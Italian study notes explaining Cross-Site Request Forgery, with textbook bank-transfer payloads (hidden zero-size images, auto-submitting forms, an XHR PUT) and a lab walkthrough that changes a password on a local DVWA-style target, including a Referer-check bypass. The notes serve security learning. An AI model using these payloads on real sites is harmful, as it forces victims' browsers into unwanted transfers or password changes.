## CSRF

- https://en.wikipedia.org/wiki/Cross-site_request_forgery
- https://owasp.org/www-community/attacks/csrf
- http://www.cgisecurity.com/csrf-faq.html

Cross-Site Request Forgery forza l'utente a fare una richiesta su un sito su cui è autenticato.
L'attacco ha come obiettivo le richieste che cambiano lo stato interno del server, non il furto di dati; infatti l'attaccante non ha modo di vedere la risposta alla richiesta malevola.
A differenza del XSS che sfrutta la fiducia di un utente nel sito, il CSRF sfrutta la fiducia che il sito ha nel browser dell'utente.

Tra le varie tecniche, l'attaccante può spingere la vittima a cliccare il tag html `a` o ad aprire l'email col tag html `img`.
Nell'esempio che segue, l'immagine non viene visualizzata in quanto ha altezza e larghezza pari a `0`.

**Scenario GET**

- tag html `a`: `<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>`

- tag html `img`: `<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">`

**Scenario POST**

Richiesta originale:

```
POST http://bank.com/transfer.do HTTP/1.1

acct=BOB&amount=100
```

Richiesta malevola:

- con interazione della vittima

```
<form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
	<input type="hidden" name="acct" value="MARIA"/>
	<input type="hidden" name="amount" value="100000"/>
	<input type="submit" value="View my pictures"/>
</form>
```

- senza interazione della vittima

```
<body onload="document.forms[0].submit()">

<form ...>
```

**Altri metodi HTTP**

Richiesta originale:

```
PUT http://bank.com/transfer.do HTTP/1.1

{ "acct":"BOB", "amount":100 }
```

Richiesta malevola:

```
<script>
	function put() {
		var x = new XMLHttpRequest();
		x.open("PUT", "http://bank.com/transfer.do", true);
		x.setRequestHeader("Content-Type", "application/json");
		x.send(JSON.stringify({"acct":"BOB", "amount":100}));
	}
</script>

<body onload="put()">
```

Nell'ultimo esempio, la richiesta **non** viene eseguita dai moderni browser grazie alla restrizione *same-origin policy*.
Questa protezione è abilitata di default, a meno che il server abiliti esplicitamente le richieste cross-origin da uno o più siti usando CORS con l'header `Access-Control-Allow-Origin`.

È possibile in alcuni casi rendere persistente l'attacco CSRF sullo stesso sito vulnerabile.
Si parla di stored CSRF flaw.
Si realizza memorizzando un tag IMG o IFRAME in un campo che accetta HTML, o tramite un più complesso attacco XSS.
Se l'attaccante può rendere persistente l'attacco sul sito, la gravità dell'attacco è amplificata.
La probabilità di successo aumenta perchè è la vittima visita più facilmente la pagina infetta rispetto a qualsiasi altra pagina su Internet.
Inoltre la vittima è quasi sicuramente già autenticata al sito vulnerabile.

### CSRF - Low

```
// Get input
$pass_new  = $_GET[ 'password_new' ];
$pass_conf = $_GET[ 'password_conf' ];
```

Richiesta GET originale:

`http://172.17.0.2/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change`

Exploit:

- `<a href="http://172.17.0.2/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change">Link</a>`

- `<img src="http://172.17.0.2/vulnerabilities/csrf/?password_new=password2&password_conf=password2&Change=Change" width="0" height="0" border="0">`

### CSRF - Medium

```
// Checks to see where the request came from
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { ... }
```

- `$_SERVER[ 'HTTP_REFERER' ]`: pagina che ha invocato la richiesta verso l'endpoint
- `$_SERVER[ 'SERVER_NAME' ]`: nome del server su cui lo script viene eseguito

Exploit:

La richiesta deve provenire da una pagina la cui URL contiene il valore di `$_SERVER[ 'SERVER_NAME' ]`.

Creo una pagina `csrf-172.17.0.2.html` contenente il codice HTML `<a href="http://172.17.0.2/vulnerabilities/csrf/?password_new=password3&password_conf=password3&Change=Change">Click me!</a>`.
Il server vulnerabile riceverà una richiesta con `Referer: http://malicious.com/csrf-172.17.0.2.html`, che verifica il controllo di `stripos`.

### CSRF - High

```
// Check Anti-CSRF token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

...

// Generate Anti-CSRF token
generateSessionToken();
```

Exploit:

TODO usa un xss per risolvere questo livello
